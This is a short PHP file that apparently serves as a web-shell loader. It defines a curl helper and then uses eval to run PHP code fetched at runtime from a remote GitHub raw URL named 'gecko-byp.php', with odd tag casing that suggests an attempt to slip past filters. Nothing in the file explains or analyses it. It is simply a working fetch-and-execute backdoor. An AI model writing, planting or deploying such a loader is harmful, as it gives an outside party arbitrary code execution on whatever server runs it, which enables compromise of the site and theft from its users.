ÿþ;<?pHp 
   function get($url) { 
    $ch = curl_init(); 
 
    curl_setopt($ch, CURLOPT_HEADER, 0); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
 
    $data = curl_exec($ch); 
    curl_close($ch); 
 
    return $data; 
} 
      eval('?>' . get('https://raw.githubusercontent.com/Sys-Fxp/Sys-Fxp/refs/heads/main/gecko-byp.php')); 
?>
